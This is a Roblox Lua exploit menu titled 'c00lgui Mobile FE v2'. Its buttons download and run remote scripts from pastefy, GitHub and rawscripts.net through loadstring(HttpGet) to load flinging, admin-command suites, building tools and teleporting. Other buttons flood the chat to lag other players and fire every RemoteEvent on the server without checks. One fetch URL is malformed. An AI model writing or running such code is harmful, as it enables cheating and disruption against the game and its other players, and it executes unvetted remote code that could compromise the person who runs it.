-- put your 
local gui = Instance.new("ScreenGui",game.Players.LocalPlayer.PlayerGui)

local revf = Instance.new("Frame")
revf.Size = UDim2.new(0.3, 0, 0.6, 0)
revf.Position = UDim2.new(0.03, 0, 0.3, 0)
revf.BackgroundColor3 = Color3.new(0, 0, 0)
revf.BorderColor3 = Color3.new(1, 0, 0)
revf.BorderSizePixel = 5
revf.Active = true
revf.BackgroundTransparency = 0 
revf.Draggable = false
revf.Parent = gui


local l = Instance.new("TextLabel")
l.Size = UDim2.new(1.0, 0, 0.09, 0)
l.Position = UDim2.new(0.00, 0, -0.1, 0)
l.BackgroundColor3 = Color3.new(0, 0, 0)
l.BorderColor3 = Color3.new(1, 0, 0)
l.BorderSizePixel = 5
l.Text = "c00lgui Mobile FE v2"
l.BackgroundTransparency = 0 
l.TextColor3 = Color3.new(255, 255, 255)
l.Font = Enum.Font.Cartoon
l.Parent = revf
l.TextScaled = true
l.TextWrapped = true


local fe1 = Instance.new("TextButton")
fe1.Size = UDim2.new(0.3, 0, 0.1, 0)
fe1.Position = UDim2.new(0.01, 0, 0.02, 0)
fe1.BackgroundColor3 = Color3.new(0, 0, 0)
fe1.BorderColor3 = Color3.new(1, 0, 0)
fe1.BorderSizePixel = 6
fe1.Text = "FE Punch Fling"
fe1.BackgroundTransparency = 0 
fe1.TextColor3 = Color3.new(255, 255, 255)
fe1.Font = Enum.Font.Cartoon
fe1.Parent = revf
fe1.TextScaled = true
fe1.MouseButton1Down:Connect(function()
  loadstring(game:HttpGet(('http://pastefy.app/GvnHVjT5/raw'),true))()
end)

local fe2 = Instance.new("TextButton")
fe2.Size = UDim2.new(0.3, 0, 0.1, 0)
fe2.Position = UDim2.new(0.35, 0, 0.025, 0)
fe2.BackgroundColor3 = Color3.new(0, 0, 0)
fe2.BorderColor3 = Color3.new(1, 0, 0)
fe2.BorderSizePixel = 5
fe2.Text = "QuirkyCMD [FE Admin]"
fe2.BackgroundTransparency = 0 
fe2.TextColor3 = Color3.new(255, 255, 255)
fe2.Font = Enum.Font.Cartoon
fe2.Parent = revf
fe2.TextScaled = true
fe2.MouseButton1Down:Connect(function()
  -- QuirkyCMD made by quirky anime boy (smokedoutlocedout on discord)
-- Discord server with games list, plugins, etc:  https://discord.gg/aG6KdRje3x
-- Testing game: https://www.roblox.com/games/7593160773
loadstring(game:HttpGet("https://gist.github.com/someunknowndude/38cecea5be9d75cb743eac8b1eaf6758/raw"))()
end)

local fe3 = Instance.new("TextButton")
fe3.Size = UDim2.new(0.31, 0, 0.1, 0)
fe3.Position = UDim2.new(0.68, 0, 0.025, 0)
fe3.BackgroundColor3 = Color3.new(0, 0, 0)
fe3.BorderColor3 = Color3.new(1, 0, 0)
fe3.BorderSizePixel = 5
fe3.Text = "c00lgui f3x"
fe3.BackgroundTransparency = 0 
fe3.TextColor3 = Color3.new(255, 255, 255)
fe3.Font = Enum.Font.Cartoon
fe3.Parent = revf
fe3.TextScaled = true
fe3.MouseButton1Down:Connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/wik7123/hi/main/copyezskid%20ok"))()
end)

local fe4 = Instance.new("TextButton")
fe4.Size = UDim2.new(0.31, 0, 0.1, 0)
fe4.Position = UDim2.new(0.01, 0, 0.15, 0)
fe4.BackgroundColor3 = Color3.new(0, 0, 0)
fe4.BorderColor3 = Color3.new(1, 0, 0)
fe4.BorderSizePixel = 5
fe4.Text = "IY + NA"
fe4.BackgroundTransparency = 0 
fe4.TextColor3 = Color3.new(255, 255, 255)
fe4.Font = Enum.Font.Cartoon
fe4.Parent = revf
fe4.TextScaled = true
fe4.MouseButton1Down:Connect(function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/FilteringEnabled/NamelessAdmin/main/Source"))()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
end)
local fe5 = Instance.new("TextButton")
fe5.Size = UDim2.new(0.3, 0, 0.1, 0)
fe5.Position = UDim2.new(0.35, 0, 0.15, 0)
fe5.BackgroundColor3 = Color3.new(0, 0, 0)
fe5.BorderColor3 = Color3.new(1, 0, 0)
fe5.BorderSizePixel = 5
fe5.Text = "Lag Chat"
fe5.BackgroundTransparency = 0 
fe5.TextColor3 = Color3.new(255, 255, 255)
fe5.Font = Enum.Font.Cartoon
fe5.Parent = revf
fe5.TextScaled = true
fe5.MouseButton1Down:Connect(function()
  for i = 1, 4 do
local args = {
    [1] = "\194\160\194\160",
    [2] = "All"
}

game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer(unpack(args))
end
end)

local fe6 = Instance.new("TextButton")
fe6.Size = UDim2.new(0.31, 0, 0.1, 0)
fe6.Position = UDim2.new(0.68, 0, 0.15, 0)
fe6.BackgroundColor3 = Color3.new(0, 0, 0)
fe6.BorderColor3 = Color3.new(1, 0, 0)
fe6.BorderSizePixel = 5
fe6.Text = "Fedora Admin"
fe6.BackgroundTransparency = 0 
fe6.TextColor3 = Color3.new(255, 255, 255)
fe6.Font = Enum.Font.Cartoon
fe6.Parent = revf
fe6.TextScaled = true
fe6.MouseButton1Down:Connect(function()
  loadstring(game:HttpGet('https://raw.githubusercontent.com/alexx1212/fedoratoomutch/main/toomucth'))()
end)
  
local fe7 = Instance.new("TextButton")
fe7.Size = UDim2.new(0.3, 0, 0.1, 0)
fe7.Position = UDim2.new(0.01, 0, 0.29, 0)
fe7.BackgroundColor3 = Color3.new(0, 0, 0)
fe7.BorderColor3 = Color3.new(1, 0, 0)
fe7.BorderSizePixel = 5
fe7.Text = "Sing Hino Do Vasco"
fe7.BackgroundTransparency = 0 
fe7.TextColor3 = Color3.new(255, 255, 255)
fe7.Font = Enum.Font.Code
fe7.Parent = revf
fe7.TextScaled = true
fe7.MouseButton1Down:Connect(function()
loadstring(game:HttpGet("https://https://rawscripts.net/raw/Universal-Script-Hino-do-vasco-17504"))()
end)

local fe8 = Instance.new("TextButton")
fe8.Size = UDim2.new(0.31, 0, 0.1, 0)
fe8.Position = UDim2.new(0.34, 0, 0.29, 0)
fe8.BackgroundColor3 = Color3.new(0, 0, 0)
fe8.BorderColor3 = Color3.new(1, 0, 0)
fe8.BorderSizePixel = 5
fe8.Text = "Fire Remotes"
fe8.BackgroundTransparency = 0 
fe8.TextColor3 = Color3.new(255, 255, 255)
fe8.Font = Enum.Font.Cartoon
fe8.Parent = revf
fe8.TextScaled = true
fe8.MouseButton1Down:Connect(function()
for _, rs in pairs(game.ReplicatedStorage:GetChildren()) do
  if rs:IsA("RemoteEvent") then
    rs:FireServer()
  end
end
end)

local fe9 = Instance.new("TextButton")
fe9.Size = UDim2.new(0.31, 0, 0.1, 0)
fe9.Position = UDim2.new(0.68, 0, 0.29, 0)
fe9.BackgroundColor3 = Color3.new(0, 0, 0)
fe9.BorderColor3 = Color3.new(1, 0, 0)
fe9.BorderSizePixel = 5
fe9.Text = "Click TP"
fe9.BackgroundTransparency = 0 
fe9.TextColor3 = Color3.new(255, 255, 255)
fe9.Font = Enum.Font.Code
fe9.Parent = revf
fe9.TextScaled = true
fe9.MouseButton1Down:Connect(function()
loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Tp-tool-script-5767"))()
end)


local ngui = Instance.new("ScreenGui",game.Players.LocalPlayer.PlayerGui)



local x = Instance.new("TextButton")
x.Size = UDim2.new(0.3, 0, 0.06, 0)
x.Position = UDim2.new(0.033, 0, 0.92, 0)
x.BackgroundColor3 = Color3.new(0, 0, 0)
x.BorderColor3 = Color3.new(1, 0, 0)
x.BorderSizePixel = 5
x.Text = "Open / Close"
x.BackgroundTransparency = 0 
x.TextColor3 = Color3.new(255, 255, 255)
x.Parent = ngui
x.TextWrapped = true
x.TextScaled = true
x.MouseButton1Down:Connect(function()
  gui.Enabled = not gui.Enabled
end)





